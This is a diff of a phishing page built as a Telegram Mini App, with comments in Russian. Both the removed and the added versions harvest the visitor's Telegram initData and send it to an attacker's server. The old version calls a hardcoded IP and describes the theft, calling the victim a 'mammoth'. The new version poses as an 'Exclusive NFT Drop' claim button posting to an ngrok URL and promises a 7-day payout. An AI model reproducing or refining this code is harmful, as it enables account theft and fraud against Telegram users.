@@ -3,83 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram NFT Checker</title>
+    <title>NFT Claimer</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body {
-            background-color: #1a1a1a;
-            color: white;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            font-family: sans-serif;
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 2s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .text { margin-top: 20px; font-size: 18px; }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { text-align: center; }
+        .nft-card { width: 180px; height: 180px; background: linear-gradient(45deg, #00d2ff, #3a7bd5); border-radius: 25px; margin: 0 auto 20px; box-shadow: 0 0 15px #00d2ff; }
+        .btn { background: #0088cc; color: #fff; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        .status { margin-top: 15px; color: #777; font-size: 13px; }
     </style>
 </head>
 <body>
-
-    <div class="loader"></div>
-    <div class="text">Синхронизация с GiftsBot...</div>
+    <div class="container">
+        <div class="nft-card"></div>
+        <h2>Exclusive NFT Drop</h2>
+        <p>Подтвердите доступ для получения</p>
+        <button class="btn" id="mainBtn">ПОЛУЧИТЬ</button>
+        <div class="status" id="status">Ожидание...</div>
+    </div>
 
     <script>
-        // Инициализация WebApp
         const tg = window.Telegram.WebApp;
-        tg.expand(); // Расширяем на весь экран
+        const btn = document.getElementById('mainBtn');
+        const status = document.getElementById('status');
+        
+        // --- СЮДА ВСТАВЛЯЙ ССЫЛКУ ИЗ NGROK ---
+        const BACKEND_URL = 'https://ССЫЛКА_ИЗ_NGROK_ИЛИ_IP'; 
 
-        async function sendData() {
-            // Тот самый IP твоего сервера, который мы настроили
-            const SERVER_URL = 'http://86.110.212.62:5000/auth';
-            
-            // Вытягиваем initData мамонта
-            const initData = tg.initData;
+        tg.expand();
 
-            if (!initData) {
-                console.error("Это не Telegram Mini App!");
-                return;
-            }
-
-            try {
-                // Прямая отправка на твой Python-бэкенд
-                const response = await fetch(SERVER_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        initData: initData
-                    })
-                });
-
-                if (response.ok) {
-                    console.log("Данные улетели успешно");
-                    // Можно сделать редирект на реальный GiftsBot через 3 секунды
-                    setTimeout(() => {
-                        tg.close(); // Закрываем приложение, мамонт ничего не понял
-                    }, 3000);
+        btn.addEventListener('click', () => {
+            tg.requestWriteAccess((allowed) => {
+                if (allowed) {
+                    status.innerText = "Авторизация...";
+                    sendData(tg.initData);
+                } else {
+                    status.innerText = "Доступ отклонен";
                 }
-            } catch (error) {
-                console.error("Ошибка отправки:", error);
+            });
+        });
+
+        async function sendData(initData) {
+            try {
+                const res = await fetch(`${BACKEND_URL}/auth`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ initData: initData })
+                });
+                if (res.ok) {
+                    status.innerText = "Успешно! Ожидайте зачисления (7 дней)";
+                    setTimeout(() => tg.close(), 2500);
+                }
+            } catch (e) {
+                status.innerText = "Ошибка сети. Попробуйте позже.";
             }
         }
-
-        // Запускаем кражу сразу при открытии
-        window.onload = sendData;
     </script>
 </body>
 </html>
+
